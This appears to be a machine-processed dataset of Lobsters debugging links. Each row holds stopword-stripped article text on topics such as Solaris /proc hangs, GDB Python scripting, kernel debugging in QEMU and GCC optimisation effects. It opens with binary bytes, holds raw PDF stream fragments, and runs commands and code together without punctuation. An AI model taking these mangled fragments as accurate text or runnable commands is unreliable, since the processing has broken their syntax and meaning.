xڥ c v cu ӱ g
183,Lobsters,debugging,Debugging,"The Day ""/proc"" Died",https://rkeene.org/projects/info/wiki/173,day proc died,solaris retarded,solaris morning got email group manager asking unix server one district date thu jan unix manager unixsagroup subject milky way district unix server someone take look whats going milky way district unix server today server acting really strange able get response p ptree command please note server consolidation work site last night manager enterprise unix storage system manager spacely sprocket incso logged expecting mundane failure workstation ssh p eaf uid pid ppid c stime tty time cmd root dec sched root dec sbininit root dec pageout root dec fsflush root dec libsvcmethodiscsid root dec libsvcbinsvcstartd root dec libsvcbinsvcconfigd root dec devfsadmd daemon dec usrlibcryptokcfd c c far good indeed appear broken probably ca nt talk ldap server something silly check nsswitchconf thing configured ldap sudoers netgroup suspiciously normal workstation ssh sudo su cd proc echo l ln c c hmm curiouser curiouser l hanging science done let take look kernel think going process hung able attach debugger running kernel one useful thing solaris however sometimes get abused see solaris retarded workstation ssh sudo su l ln proc echo mdb k walk thread findstack v stack pointer thread ffffffffffffffef ffffffffffffffff simple enough seems waiting conditional variable cvwait part mutex lock process made system call stat file whose name stored pointer probably point string filename proc since running l switch context process interpret memory p debugger context set proc segmentation fault oh well nt nice let try another way mdb p mdb failed initialize libthreaddb call failed unexpectedly mdb warning debugger able examine raw lwps loading module print char l hanging stat called running pid hmm well ca nt run p since stat file proc hang modular debugger rescue echo p fz mdb k grep pid ppid pgid sid zone uid flag addr name r process corresponds command name run uid zone know world mdb k loading module unix genunix specfs dtrace ufs sd mpt px md ldc ip hook neti sctp arp usba fcp fctl emlxs qlc lofs zfs ssd random crypto fcip logindmux ptm nfs ipc walk thread findstack v stack pointer thread b f b f b f hmm well process also seems waiting conditional variable mutex lock part zfs kernel module maybe related look storage available zone id obtained via zoneadm list v noticed zpool provides storage zone including fulli send email detailing finding someone log zone clean file thing magically start working againhooray
184,Lobsters,debugging,Debugging,Automate Debugging with GDB Python API,https://interrupt.memfault.com/blog/automate-debugging-with-gdb-python-api,automate debugging gdb python api,previously python api python api automate subscribe getting started gdb python python api gdb release note check gdb compiled python support official arm embedded toolchain example usage gdb pretty printer writing pretty printer writing custom pretty printer gdb python gdb custom command adding custom gdb command gdb python gdbcommand auto loading script gdbinit closing code size using python pypi package gdb github,previously discussed significant portion developer time spent debugging firmware gdb powerful utility article discus become efficient debugging leveraging gdb python api system hit failure state often find looking similar state determine system got failure mode may entail inspecting linked list heap o primitive mutexes queue state peripheral etc perhaps guilty thing like determine much memory burned linked list gdb p slisthead uuidlistnode gdb p slisthead next struct uuidlistnode gdb p slisthead next next struct uuidlistnode gdb p slisthead next next next struct uuidlistnode gdb p slisthead next next next next struct listnode manual typing may fine debugging one crash issue scale new firmware qa first time hundred device important able quickly classify issue time spent debugging cause schedule slip even product make wild issue appears device one million device fleet would generate report per month manually inspecting hundred crash fun fortunately gdb allows user extend core functionality number way including via python api allows one accelerate many case even automate debugging series post explore gdb python apis used like interrupt subscribe get latest post straight mailbox getting started gdb python gdb python api introduced part gdb way back continues receive new feature improvement gdb updated look python gdb release note check gdb compiled python support gdb python api gdb compile time option enabled withpython configuration argument easily check gdb feature enabled checking pathtogdb config gdb configured follows withpythonusr type arm cortexm development luck official arm embedded toolchain publishes gdb variant python enabled binarmnoneeabigdbpy release use need python installed system ie ubuntu aptget install pythondev osx moment preinstalled system python used example usage let walk trivial example snippet code get idea apis work snippet track uuids ram linked list real embedded system may bunch item identified uuid stored external flash list item looked frequently may cached ram faster access better power include inttypesh include stddefh include stdlibh typedef struct uuid byte uuid typedef struct uuidlistnode struct uuidlistnode next uuid uuid uuidlistnode static uuidlistnode slisthead null void listadduuid const uuid uuid uuidlistnode nodetoadd malloc sizeof uuidlistnode assert nodetoadd null nodetoadd uuidlistnode uuid uuid add entry front list nodetoadd next slisthead slisthead nodetoadd code populate list fake data completely fake uuidgenerator implementation static void generatefakeuuid uuid uuid sizet sizeof uuid uuid byte rand static void generatefakeuuidlist void int uuid uuid generatefakeuuid uuid listadduuid uuid int main void generatefakeuuidlist let spin loop break point dump list return gdb pretty printer print structure gdb display individual field slisthead code would look something like gdb p slisthead uuidlistnode gdb p slisthead next uuid byte clean little enabling pretty printing put field newline gdb set print pretty gdb p slisthead uuidlistnode gdb p slisthead next uuid byte take step farther writing pretty printer uuids typically displayed string format xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx let see update gdb display uuid struct like writing custom pretty printer gdb python add custom pretty printer need define class detect whether pretty printing supported given particular type detector need define call function given gdbvalue either return custom printer none handle value printer class need define tostring function gdb call display value let start boilerplate uuid pretty printer implementation file called customgdbextensionspy gdbprinting import prettyprinter registerprettyprinter import gdb import uuid class uuidprettyprinter object print struct uuid xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx def init self val selfval val def tostring self return todo implement class customprettyprinterlocator prettyprinter given gdbvalue search custom pretty printer def init self super customprettyprinterlocator self init myprettyprinters def call self val return custom formatter type handled typename gdbtypesgetbasictype valtype tag typename none typename valtypename typename uuid return uuidprettyprinter val need register custom pretty print detector gdb appending following script registerprettyprinter none customprettyprinterlocator replacetrue replacetrue useful developing pretty printer script resource overwrite previous pretty printer version let source script see happens see new pretty printer name gave myprettyprinters list gdb source customgdbextensionspy gdb info prettyprinter global prettyprinters builtin myprettyprinters let try print head list node see get gdb p slisthead next uuid todo implement great see pretty printer got called uuid todo implement returned match current tostring implementation let fill actual implementation def tostring self gdbvalue accessed like would c since uuid struct index byte grab value entry array array selfval byte format byte array hex string python uuid module used get string uuidbytes join int array range arraytypesizeof return str uuiduuid uuidbytes let resource script see get gdb source customgdbextensionspy gdb p slisthead next uuid gdb p slisthead next next uuid gdb custom command gdb also let user define custom command aid debugging list custom command available always easily found running help userdefined within gdb example great see uuid formatted normal way still painful display entire list compute size still walk manually gdb p slisthead next next next next next next next next next uuid gdb p slisthead next next next next next next next next next next uuid instead let add custom gdb command work u adding custom gdb command gdb python new cli command added via python script creating new subclass gdbcommand use gdbparseandeval utility convert arbitrary argument passed command gdbvalue index c struct member traverse object example parse uuidlistnode pointer following next pointer reach end list let add following customgdbextensionspy script class uuidlistdumpcmd gdbcommand print listnode example nice format def init self super uuidlistdumpcmd self init uuidlistdump gdbcommanduser def uuidlisttostr self val walk uuidlistnode list simply follow next pointer encounter null idx nodeptr val result nodeptr uuid nodeptr uuid result n addr x uuid idx nodeptr uuid nodeptr nodeptr next idx result found linked list node idx result return result def complete self text word expect argument passed symbol fallback internal tabcompletion handler symbol return gdbcompletesymbol def invoke self args fromtty pas args use python cli utility like argparse argument parsing print args passed args nodeptrval gdbparseandeval args str nodeptrvaltype uuidlistnode print expected pointer argument type uuidlistnode return print selfuuidlisttostr nodeptrval actually load command need instantiate object adding following end customgdbextensionspy command appear userdefined list gdb help userdefined userdefined command command class defined user use define command define command list command uuidlistdump print listnode example nice format let try gdb uuidlistdump slisthead args passed slisthead found linked list node addr uuid addr uuid addr uuid addr uuid addr uuid addr uuid addr uuid addr uuid addr uuid addr uuid could even start dumping list middle example let take address entry gdb uuidlistdump uuidlistnode args passed uuidlistnode found linked list node addr uuid addr uuid addr uuid addr uuid addr uuid auto loading script automatically load custom extension adding following gdbinit file invoked anytime gdb start source pathtocustomgdbextensionspy alternatively could also get run automatically gdb started adding ex source pathtocustomgdbextensionspy argument closing hope post gave useful overview add custom gdb command pretty printer using python api sometimes adding gdb command like even used reduce code size replacing ondevice cli command would display information already idea python api could applied automate part debugging flow perhaps command walk custom heap display content memorymapped filesystem maybe already great example used gdb python either way let u know discussion area next time talk use thirdparty python package within gdb using virtual environment edit post written using python pypi package gdb code used blog post available github see anything like change submit pull request
185,Lobsters,debugging,Debugging,Debugging: appearances vs. reality,https://twitter.com/trptcolin/status/1129850896966406145,debugging appearance v reality,,detected javascript disabled browser would like proceed legacy twitter yes
186,Lobsters,debugging,Debugging,Single-stepping through the Kernel,https://www.anmolsarma.in/post/single-step-kernel/,singlestepping kernel,singlestepping kernel tech linux kernel higher being might pour scorn skip end nb one true kernel building kernel kernelorg htop work serial port creating root filesystem important want avoid corrupted image email protected email protected attaching debugger kaslr bonus networking tap interface copypasta email protected,singlestepping kernel feb tech linux kernel may come time system programmer life need leave civilized safety userland confront unspeakable horror dwell depth kernel space higher being might pour scorn idea kernel debugger u lesser mortal may recourse singlestep kernel code river begin run dry guide help hope never actually ominous sounding introbait notwithstanding setting virtual machine kernel debugging really difficult need bit preparation want copypasta skip end interested predicament involved deal read nb kernel talking heathen may invariably ask obvious kernel capital k refers one true kernel building kernel using minimal kernel configuration instead kitchensink one distribution usually ship make life lot easier first need grab source code kernel interested use latest kernel release tarball kernelorg time writing inside extracted source directory invoke following make defconfig make kvmconfig make build minimal kernel image booted qemu like kernel bring ancientlooking window cryptic error message could try pasting error message google search engine except fact select text window frankly window look annoying ignoring actual error moment let try get qemu print console instead spawning new graphical window kernel nographic qemu spit single line warning tcg nt support requested feature ecxvmx bit htop tell qemu using cpu laptop fan agrees output whatsoever ctrlc work work however pressing ctrla hitting x turn passing nographic plugged qemu virtual monitor actually see output need tell kernel write serial port nographic kernel append worked read error message glory vfs open root device null unknownblock error please append correct root boot option available partition driver sr kernel panic syncing vfs unable mount root f unknownblock cpu pid comm tainted hardware name qemu standard pc piix bios call trace kernel offset relocation range end kernel panic syncing vfs unable mount root f unknownblock kernel find root filesystem kick user mode panicked let fix creating root filesystem image creating root filesystem start creating empty image qemuimg create rootfsimg format mount rootfsimg mkdir mnt sudo mount loop rootfsimg mnt populate using debootstrap sudo debootstrap bionic mnt create root filesystem based ubuntu bionic beaver course feel free replace bionic release prefer unmount filesystem done important want avoid corrupted image boot kernel filesystem need tell qemu use image virtual hard drive also need tell kernel use hard drive root filesystem nographic kernel hda rootfsimg append rootdevsda time kernel panic eventually see login prompt could setup user creating filesystem annoying login time boot vm let enable auto login root instead terminate qemu ctrla x mount filesystem image create configuration folder structure sudo mount loop rootfsimg mnt sudo mkdir p mntetcsystemdsystem email protected add following line mntetcsystemdsystem email protected autologinconf service execstart execstartsbinagetty noissue autologin root term typeidle make sure unmount filesystem boot kernel time automatically logged gracefully shutdown vm attaching debugger let rebuild kernel debugging symbol enabled scriptsconfig e configdebuginfo make boot kernel time passing flag make qemu listen tcp port nographic kernel hda rootfsimg append rootdevsda another terminal start gdb attach qemu gdb reading symbol done gdb target remote remote debugging using gdb set breakpoint kernel function instance dosysopen gdb b dosysopen breakpoint file fsopenc line gdb c continuing try opening file vm result dosysopen getting nothing happens breakpoint gdb hit due kernel security feature called kaslr kaslr disabled boot time adding nokaslr kernel command line argument let actually rebuild kernel without kaslr let also disable loadable module support well save u trouble copying module filesystem scriptsconfig e configdebuginfo configrandomizebase configmodules make olddefconfig resolve dependency make reboot kernel attach gdb set breakpoint dosysopen run cat etcissue guest time breakpoint hit probably expected breakpoint dosysopen etcldsocache gdb c continuing breakpoint dosysopen gdb c continuing breakpoint dosysopen etcissue gdb congratulation point singlestep away heart content default root filesystem mounted read want able write add rw rootdevsda kernel parameter nographic kernel hda rootfsimg append rootdevsda rw bonus networking create point point link qemu vm host using tap interface first install tunctl create persistent tap interface avoid running qemu root sudo apt install umlutilities sudo sudo tunctl u id u set persistent owned uid sudo ip link set launch qemu virtual interface connected host interface nographic device netdev tap kernel hda rootfsimg append rootdevsda rw guest boot bring network interface ip link set ip lo loopback lowerup mtu qdisc noqueue state unknown group default qlen linkloopback brd inet scope host lo validlft forever preferredlft forever scope host validlft forever preferredlft forever broadcast multicast lowerup mtu qdisc pfifofast state group default qlen linkether brd ff ff ff ff ff ff ff scope link validlft forever preferredlft forever qemu host communicate using linklocal address copypasta building minimal debuggable kernel make defconfig make kvmconfig scriptsconfig e configdebuginfo configrandomizebase configmodules make olddefconfig make create root filesystem qemuimg create rootfsimg rootfsimg mkdir mnt sudo mount loop rootfsimg mnt sudo debootstrap bionic mnt add following line mntetcsystemdsystem email protected autologinconf start service execstart execstartsbinagetty noissue autologin root term typeidle end unmount filesystem sudo umount mnt boot kernel root file system qemu nographic kernel hda rootfsimg append rootdevsda rw attach gdb gdb gdb target remote
187,Lobsters,debugging,Debugging,"Dapper, a Large-Scale Distributed Systems Tracing Infrastructure",https://storage.googleapis.com/pub-tools-public-publication-data/pdf/36356.pdf,dapper largescale distributed system tracing infrastructure,,obj length filter flatedecode stream h r p g uߏ
188,Lobsters,debugging,Debugging,What does debugging a program look like?,https://jvns.ca/blog/2019/06/23/a-few-debugging-resources/,debugging program look like,mentioned twitter couple debugging resource debugging david agans debugging debugging poster debug john regehr debug blog post reviewing book debugging reproduce bug explain reproduce bug selenium accept probably code fault start experiment nice short explanation reproduce bug change one thing time check assumption sure list common incorrect assumption weird method get information adding sound mobile tweet using xcode play sound io debugging adding led string peep write code easier debug write code easy delete easy debug error message better silently failing failure print stack error one error called failure understand error message mean common python error mean,debugging friend relatively new programmer yesterday showed debugging tip thinking teach debugging morning mentioned twitter never seen really good guide debugging code ton really great reply anne ogborn tweet interested debugging tip usual got lot helpful answer idea teach debugging skill describe process debugging couple debugging resource hoping link debugging booksguides recommendation got debugging david agans several people recommended book debugging look like nice fairly short book explains debugging strategy read yet though ordered see recommending rule laid book understand system make fail quit thinking look divide conquer change one thing time keep audit trail check plug get fresh view fix fixed seem extremely resaonable also charming debugging poster debug john regehr debug good blog post based regehr experience teaching university embedded system course lot good advice also blog post reviewing book debugging including agans book reproduce bug rest post going attempt aggregate different idea debugging people tweeted somewhat obviously everybody agrees able consistently reproduce bug important want figure going intuitive sense sure explain go saw bug twice consistently reproduce bug demand laptop wonder whether technique use depend domain backend web dev frontend mobile game c program embedded etc reproduce bug quickly everybody also agrees extremely useful able reproduce bug quickly take minute check every change helped iterating slow suggested approach something requires clicking bunch thing browser reproduce recording clicked selenium getting selenium replay ui interaction suggested writing unit test reproduces bug bonus add test suite later make sense writing script finding command line incantation like curl myapplocalwhatever accept probably code fault sometimes see problem like oh library x bug oh dns oh thing code broken sometimes code general established library code wrote last month usually code wrote last month problem start experiment actgardner gave nice short explanation reproduce bug try encourage people first fully understand bug happening expect happen happen happen apply mental model system guess could breaking come experiment experiment could changing removing code making api call repl trying new input poking memory value debugger print statement think loop may make guess one aspect might happening variable set x server sent wrong request code never running experiment check guess repeat understand going change one thing time everybody definitely agrees important change one thing time experiment verify assumption check assumption lot debugging realizing something sure true wait request going new server right old one true made attempt list common incorrect assumption example variable set x filename definitely right variable value possibly changed x code right thing function x editing right file typo line wrote line code documentation correct code looking executed point two piece code execute sequentially parallel code thing compiled debug release mode without compiler buggy though last purpose compiler rarely blame weird method get information lot normal way experiment check assumption guess code print variable value use debugger etc sometimes though difficult environment print thing access debugger inconvenient thing maybe many event way cope adding sound mobile mobile world live advice xcode play sound hit breakpoint continue without stopping place certain place code listen buzzing tink indicate tight loop morsepop pair catch unbalanced event also tweet cool talk using xcode play sound io debugging adding led embedded dev age ago grid transputers wired led unused pin chip surprisingly effective diagnosing parallelism issue string network prof told hack saw xerox early day ethernet tap coax amp motor piece string busier network faster string twirled peep network auralizer translates happening system sound spent minute trying get compile failed far look fun want try point information important thing need whatever necessary get information write code easier debug another point people brought improve program make easier debug tef nice post write code easy delete easy debug thought true debuggable code necessarily clean code littered check error handling rarely make pleasant reading think one interpretation easy debug every single time error program report exactly happened easy understand way whenever program problem say sometihng error failure connect someip port connection timeout like thank kind thing wanted know check need fix firewall thing got wrong ip reason one simple example recently making request server wrote reponse got upstream connect error disconnectreset header nginx error basically case boiled program crashed sent anything response request figuring cause crash pretty easy better error handling returning error instead crashing would saved little time instead go check cause crash could read error message figured going right away error message better silently failing get closer dream every single time error program report exactly happened easy understand way also need disciplined immediately returning error message instead silently writing incorrect data passing nonsense value another function know cause gigantic headache mean adding code like unexpectedthing raise oh thing happened easy get right always obvious raising error really help lot failure print stack error one error related returning helpful error make easy debug rust really incredible error handling library called failure basicaly let return chain error instead one error print stack error like error starting server process caused error initializing logging backend caused connection failure timeout connecting port much useful connection failure timeout connecting port tell significance something logging backend think also useful connection failure timeout connecting port stack trace summarizes high level part went wrong instead making read line stack trace might relevant tool like language go idiom seems concatenate stack error together big string get error thing one error thing two error thing three work okay definitely lot le structured failure system java hear give exception cause used python use raise set cause attribute exception exception separated exception direct cause following exception know language interested hear understand error message mean one sub debugging skill take granted lot time understanding error message mean came across nice graphic explaining common python error mean break thing like nameerror ioerror etc think reason interpreting error message hard understanding new error message might mean learning new concept nameerror mean code us variable outside scope defined really understand need understand variable scope ran lot learning rust rust compiler would like weird lifetime error like ugh ok rust get go actually learn lifetime work lot time error message caused problem different text message like upstream connect error disconnectreset header might mean julia server crashed skill understanding error message mean often transferable switch new area started writing lot react something tomorrow would probably idea error message meant definitely issue beginner programmer feel like big thing missing talking debugging skill stronger understanding people get stuck debugging easy say well need reproduce problem make minimal reproduction start coming guess verifying improve mental model system figure fix problem hopefully write test make come back people actually getting stuck practice hardest part sense hardest part usually still sure hardest part usually someone newer debugging code
189,Lobsters,debugging,Debugging,GCC gOlogy: studying the impact of optimizations on debugging,http://www.fsfla.org/~lxoliva/writeups/gOlogy/gOlogy.txt,gcc gology studying impact optimization debugging,,alexandre oliva gology gology stand study optimization level selected flag affect quality debugging information enabled g flag report ass theoretical practical impact various optimization available gnu compiler collection version debugging experience application compiled goal ass quality debug information generated gcc optimization enabled document effect optimization pass identify document problem opportunity improve gcc offer various optimization level plus og osize ofast way hundred independentlycontrollable optimization flag optimization level enables subset optimization flag enabling debugging information generation hand supposed effect whatsoever executable code report focus flag enabled option effect extended dwarf debug information generated gcc report structured follows introduction outline gcc get source code output assembly code debug information major internal representation form used throughout compilation several technique used gcc keep track mapping internal representation output executable code corresponding source code concept bulk report go flag optimization pass enabled affected flag describing general behavior pas effect may debug information final section highlight consolidates relevant finding introduction gcc language front end parse translation unit deliver socalled middle end number function procedure method subprogram compile form although languageindependent closely resembles parse tree function go number pass executed certain optimization flag enabled condition met tree form turned gimple form function amount set basic block control flow graph containing sequence stmts represented tuples stmt may label definition simple assignment function call conditional unconditional branch asm statement debug bind marker le common form scalar variable versioned converted static single assignment ssa form reference variable take version link back single definition variable version additional definition called phi node may introduced confluence basic block indicating version taken arriving incoming block form optimization pass gcc take place function expanded register transfer language rtl form basic block formed sequence insns one corresponding machine instruction defined target back end machineindependent form debug bind marker note form relevant report insn may contain zero computation represented set one may set pc indicate branch call asm indicator additional register memory used unpredictably modified scalar variable initially assigned pseudoregisters many rtl optimization pass operate form register allocation map remaining pseudoregister hardware register optimizing stack slot adding spill reloads needed satisfy requirement hardware instruction rtl pass run register allocation end assembly code output insn outputting debug information interspersed assembly code gathering debug information consolidated output afterwards preserving debug information time debugging required disabling optimization debug information format back could assign single location variable optimizing frame pointer would remove base reference stackbased variable gcc long notion enabling debug information cause change executable code end stmt insn carry source location information ie file line recently column number lexical block even debug information enabled without optimization make singlestepping debugger natural order execution variable assigned stable memory location make single location per variable throughout lifetime optimization introduce complication combining simplifying removing computation modifying order execution reusing register stack slot duplicating portion code introducing alternate induction variable modifying iteration order loop nest compiler debug information format evolved time enable optimized program represented debugged varying level success example automatic variable optimized program may live register time another register another time stack slot time dwarf debug information support location list may indicate different location variable different possiblyoverlapping executable code range memory reference gimple rtl form carry symbolic expression used alias analysis also build location list ssa version rtl pseudoregisters hardware register also carry symbolic reference variable refer variable tracking pas identifies using symbolic reference situation location variable varies throughout lifetime arranges location list output accordingly location expression gained ability represent value expression became possible indicate certain range variable hold known constant value value available directly computed location variable tracking assignment extended variable tracking introducing debug bind early compilation associate scalar source variable location value stored arranging locationvalue expression adjusted throughout compilation even computation removed moved past bind bound value expression remain accurate preserving natural execution order using bind generate location list although stmt insn carry source location information shuffled optimization singlestepping may go back earlier statement becomes impossible tell effect statement complete statement frontier note sfn introduced additional debug note emitted far c c parser stmt stream mark beginning logical statement thus debug bind associated previous statement take effect natural execution order retained compiler marker used output source location information marked recommended stop point isstmt flag dwarf line number table avoiding bouncing making predictable observability side effect given optimization uncommon executable code remain inspection point multiple neighbor statement problem although multiple source location associated single address line number table range location list could name address executable instruction location view lvu numbering introduced identify entry line number table refer code address referenced unambiguously location list representation extended location list requires extension proposed dwarf time writing nt debugger support extended location list still since gcc make information available expect debugger catch eventually analysis follow assume disambiguation given lvu effective masking optimization effect created overcome despite effort realistic expect debug experience program without optimization program optimized even optimization regarded affecting debugging example variable assigned exclusive stack slot available throughout function optimization may assign register limited live range wo nt possible inspect elsewhere setting breakpoints based address executable code may work effectively optimized program spot program may duplicated optimization breakpoint may hit expected value variable available given location say stack slot guarantee possible modify say could loaded register may modified program stored back stack slot might happen even without optimization window possibility narrower furthermore folding logically follows reasoning known variable compile time may longer applicable variable modified debugger block removed condition guarding provably false compile time changing variable condition would evaluate true bring back code optimized inspecting variable optimized program likely yield optimized optimization may expose dead range noticed modifying may always conflict optimization breakpoints using source location rather code address le likely yield surprising result optimization section optimization level detailed enumerating flag incrementally enabled previous level detailing effect debugging brought optimization level flag optimization level form nearlystrict crescendo term pass activate og og o o ofast ofast nevertheless determining pas run involved process pas gate function decides whether run pas based optimization level flag defaultoptionstable array gccoptsc arranges flag enabled depending optimization level flag enabled default initializer eg gcccommonopt also forced enabled disabled depending condition however even gate condition pas enabled might run enclosing pas group fails gate condition following outline depicts optimization pass gcc go compiling function order might run information extracted gccpassesdef indentation indicates grouping indented pass within previous lessindented pas group parameter pas indicated parenthesis pas name allloweringpasses passwarnunusedresult passdiagnoseompblocks passdiagnosetmblocks passloweromp passloweromp see passlowercf passlowertm passrefactoreh passlowereh passlowereh see og ogpasslowereh passbuildcfg passwarnfunctionreturn passexpandomp passexpandomp see og ogpassexpandomp passsprintflength foldreturnvalue passwalloca strictmode passbuildcgraphedges allsmallipapasses passipafreelangdata passipafunctionandvariablevisibility passipachkpversioning passipachkpearlyproducethunks passbuildssapasses passfixupcfg passbuildssa passwarnnonnullcompare passubsan passearlywarnuninitialized passnothrow passrebuildcgraphedges passchkpinstrumentationpasses passfixupcfg passchkp passrebuildcgraphedges passlocaloptimizationpasses passfixupcfg passrebuildcgraphedges passlocalfnsummary passearlyinline passallearlyoptimizations passremovecgraphcalleeedges passobjectsizes insertminmax passccp passccp nonzero ogtreeccp see also treebitccp ipabitcp osipabitcp passforwprop passforwprop passearlythreadjumps passsraearly passsraearly passbuildealias passbuildealias passfre passfre ogtreefre passearlyvrp passearlyvrp ostreevrp passmergephi passmergephi passdse passdse ogtreedse passcddce passcddce ogtreedce see also treedce aggressive ostreedce aggressive passearlyipasra passearlyipasra osipasra passtailrecursion passtailrecursion osoptimizesiblingcalls passconvertswitch passconvertswitch ostreeswitchconversion passcleanupeh passcleanupeh see og ogpasssplitcritedges passprofile passprofile see guessbranchprobability ogguessbranchprobability passlocalpureconst passlocalpureconst ogipapureconst passsplitfunctions passsplitfunctions ospartialinlining passstrippredicthints passreleasessanames passrebuildcgraphedges passlocalfnsummary passipaoacc passipapta passipaoacckernels passoacckernels passch passch ogtreech passfre see passfre passlim passlim passdominator passdominator maypeelloopheaders passdce passdce ogtreedce passparallelizeloops oacckernels passexpandompssa passexpandompssa see og ogpassexpandomp passrebuildcgraphedges passtargetclone passipachkpproducethunks passipaautoprofile passipatreeprofile passfeedbacksplitfunctions passipafreefnsummary small passipaincreasealignment passipaincreasealignment passipatm passipaloweremutls allregularipapasses passipawholeprogramvisibility passipaprofile passipaprofile ogipaprofile passipaicf passipaicf osipaicf passipadevirt passipadevirt osdevirtualize see also devirtualizespeculatively osdevirtualizespeculatively passipacp passipacp osipacp see also ipabitcp osipabitcp ipavrp osipavrp ipacpclone passipacdtormerge passipahsa passipafnsummary passipainline passipainline see og ogpassipainline inlinefunctionscalledonce inlinesmallfunctions osinlinesmallfunctions indirectinlining osindirectinlining o osinlinefunctions passipapureconst passipapureconst ogipapureconst passipafreefnsummary small passipareference passipareference ogipareference passipacomdats alllateipapasses passmaterializeallclones passipapta passompsimdclone allpasses passfixupcfg passlowerehdispatch passoaccdevicelower passompdevicelower passomptargetlink passalloptimizations passremovecgraphcalleeedges passstrippredicthints passccp nonzero see passccp passpostipawarn passcompleteunrolli passcompleteunrolli ospasscompleteunrolli see also treeloopivcanon passbackprop passbackprop passphiprop passphiprop passforwprop see passforwprop passobjectsizes insertminmax passbuildalias passbuildalias passreturnslot passreturnslot ogpassreturnslot passfre see passfre passmergephi see passmergephi passthreadjumps passthreadjumps osexpensiveoptimizationspassthreadjumps passvrp passvrp warnarraybounds ostreevrp passchkpopt passdce see passdce passstdarg passstdarg passcallcdce passcallcdce passcselim passcselim passcopyprop passcopyprop ogtreecopyprop passtreeifcombine passtreeifcombine passmergephi see passmergephi passphiopt passphiopt see also hoistadjacentloads oshoistadjacentloads passtailrecursion see passtailrecursion passch see passch passlowercomplex passsra passsra passthreadjumps see passthreadjumps passdominator maypeelloopheaders see passdominator passisolateerroneouspaths passisolateerroneouspaths osisolateerroneouspathsdereference passphionlycprop passphionlycprop passdse see passdse passreassoc passreassoc insertpowi passdce see passdce passforwprop see passforwprop passphiopt see passphiopt passccp nonzero see passccp passcsesincos passcsesincos ogpasscsesincos passoptimizebswap passoptimizebswap osexpensiveoptimizationspassoptimizebswap passladdress passladdress passlim see passlim passwalloca strictmode passpre passpre ostreepre see also codehoisting oscodehoisting treetailmerge ostreetailmerge treepartialpre passsinkcode passsinkcode ogtreesink passsancov passasan passtsan passdce see passdce passfixloops passfixloops passtreeloop passtreeloop passtreeloopinit passtreeunswitch passtreeunswitch passscevcprop passscevcprop passloopsplit passloopsplit passloopjam passloopjam passcddce see passcddce passivcanon passivcanon passloopdistribution passloopdistribution see also treeloopdistributepatterns passlinterchange passlinterchange passcopyprop see passcopyprop passgraphite passgraphitetransforms passlim see passlim passcopyprop see passcopyprop passdce see passdce passparallelizeloops oacckernels passexpandompssa see passexpandompssa passchvect passchvect ogtreech see also treeloopvectorize passifconversion passifconversion passvectorize passvectorize see also vectcostmodelcheap osvectcostmodelcheap vectcostmodeldynamic passdce see passdce passpredcom passpredcom passcompleteunroll passcompleteunroll see also treeloopivcanon peelloops passslpvectorize passslpvectorize see also vectcostmodelcheap osvectcostmodelcheap vectcostmodeldynamic passloopprefetch passivoptimize passivoptimize passlim see passlim passtreeloopdone passtreenoloop passtreenoloop passslpvectorize see passslpvectorize passsimduidcleanup passlowervectorssa passlowervectorssa see og ogpasslowervector passcsereciprocals passcsereciprocals ofastreciprocalmath passsprintflength foldreturnvalue passreassoc insertpowi see passreassoc passstrengthreduction passstrengthreduction ogtreeslsr see also expensiveoptimizations osexpensiveoptimizationspassstrengthreduction passsplitpaths passsplitpaths passtracer passthreadjumps see passthreadjumps passdominator maypeelloopheaders see passdominator passstrlen passstrlen passthreadjumps see passthreadjumps passvrp warnarraybounds see passvrp passwarnrestrict passphionlycprop see passphionlycprop passdse see passdse passcddce see passcddce passforwprop see passforwprop passphiopt see passphiopt passfoldbuiltins passfoldbuiltins see og ogpassfoldbuiltins inlineatomics passoptimizewideningmul passoptimizewideningmul osexpensiveoptimizationspassoptimizewideningmul passstoremerging passstoremerging osstoremerging passtailcalls passtailcalls osoptimizesiblingcalls passdce see passdce passsplitcritedges passsplitcritedges ogpasssplitcritedges passlatewarnuninitialized passuncprop passuncprop passlocalpureconst see passlocalpureconst passalloptimizationsg passremovecgraphcalleeedges passstrippredicthints passlowercomplex passlowervectorssa see passlowervectorssa passccp nonzero see passccp passpostipawarn passobjectsizes passfoldbuiltins see passfoldbuiltins passsprintflength foldreturnvalue passcopyprop see passcopyprop passdce see passdce passsancov passasan passtsan passsplitcritedges see passsplitcritedges passlatewarnuninitialized passuncprop see passuncprop passlocalpureconst see passlocalpureconst passtminit passtmmark passtmmemopt passtmedges passsimduidcleanup passvtableverify passlowervaarg passlowervector passlowervector see og ogpasslowervector passlowerswitch passsanopt passcleanupeh see passcleanupeh passlowerresx passnrv passcleanupcfgpostoptimizing passwarnfunctionnoreturn passgenhsail passexpand passexpand see og ogpassexpand treecoalescevars ogtreecoalescevars treeter ogtreeter deferpop ogdeferpop expensiveoptimizations osexpensiveoptimizationspassstrengthreduction passrestofcompilation passinstantiatevirtualregs passintocfglayoutmode passjump passjump see og ogpassjump threadjumps osthreadjumps passlowersubreg passlowersubreg ogsplitwidetypes passdfinitializeopt passdfinitializeopt see og ogpassdfinitializeopt passcse passcse ogpasscse see also expensiveoptimizations osexpensiveoptimizationspassstrengthreduction reruncseafterloop osreruncseafterloop csefollowjumps oscsefollowjumps passrtlfwprop passrtlfwprop ogforwardpropagate passrtlcprop passrtlcprop osgcse passrtlpre passrtlpre osgcse passrtlhoist passrtlhoist osgcse passrtlcprop see passrtlcprop passrtlstoremotion passcseafterglobalopts passcseafterglobalopts osreruncseafterloop see also csefollowjumps oscsefollowjumps passrtlifcvt passrtlifcvt passreginfoinit passrtlloopinit passrtlmoveloopinvariants passrtlmoveloopinvariants see also og ogpassrtlmoveloopinvariants passrtlunrollloops passrtldoloop passrtldoloop passrtlloopdone passweb passrtlcprop see passrtlcprop osreruncseafterloop see also csefollowjumps oscsefollowjumps ogdse passrtlfwpropaddr passrtlfwpropaddr ogforwardpropagate passincdec passincdec ogautoincdec passinitializeregs passinitializeregs ogpassinitializeregs passudrtldce passudrtldce osdce ud passcombine passcombine ogpasscombine see also expensiveoptimizations osexpensiveoptimizationspassstrengthreduction passifaftercombine passifaftercombine passpartitionblocks passoutofcfglayoutmode passsplitallinsns ogsplitwidetypes passdfinitializenoopt passstackptrmod passmodeswitching passmatchasmconstraints passsms passliverangeshrinkage passsched passsched passearlyremat passearlyremat ospassearlyremat passira passira see og ogpassira irasharesaveslots ogirasharesaveslots omitframepointer ogomitframepointer o ospassira expensiveoptimizations osexpensiveoptimizationspassstrengthreduction callersaves oscallersaves ipara osipara lraremat oslraremat passreload passreload see og ogpassreload expensiveoptimizations 